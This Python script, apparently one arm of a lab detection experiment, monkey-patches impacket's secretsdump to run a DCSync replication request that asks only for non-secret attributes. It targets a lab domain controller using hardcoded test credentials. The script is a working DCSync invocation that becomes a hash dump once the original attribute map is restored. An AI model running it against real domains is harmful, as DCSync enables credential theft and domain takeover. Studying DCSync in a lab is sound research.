"""Arm 1 — Monkey-patch secretsdump to test non-secret DRS attrs."""
import datetime, sys, os
from impacket.dcerpc.v5 import drsuapi
from impacket.examples.secretsdump import NTDSHashes

NON_SECRET_ATTRS = {
    '1.2.840.113556.1.4.1': '1.2.840.113556.1.4.1',    # name
    '1.2.840.113556.1.4.28': '1.2.840.113556.1.4.28',   # objectClass
    '1.2.840.113556.1.4.167': '1.2.840.113556.1.4.167',  # instanceType
}

# Replace the class attribute
orig_attr = NTDSHashes.ATTRTYP_TO_ATTID
NTDSHashes.ATTRTYP_TO_ATTID = NON_SECRET_ATTRS

ts = datetime.datetime.now(datetime.UTC)
print(f"TIMESTAMP: {ts.strftime('%Y-%m-%dT%H:%M:%S')}Z")
print("ARM 1: dcsynctest + non-secret DRS attrs")
print(f"ATTRS: {list(NON_SECRET_ATTRS.keys())}")

sys.argv = ['secretsdump.py', '-just-dc-user', 'vagrant', '-target-ip', '192.168.50.9',
            'WINDOMAIN2025/dcsynctest:Test123!@192.168.50.9']

# Run secretsdump as __main__ (keeps monkey-patch in current process)
sys.argv = ['secretsdump.py', '-just-dc-user', 'vagrant', '-target-ip', '192.168.50.9',
            'WINDOMAIN2025/dcsynctest:Test123!@192.168.50.9']
import runpy
runpy.run_path('/usr/local/lib/python3.13/dist-packages/impacket/examples/secretsdump.py',
               run_name='__main__')
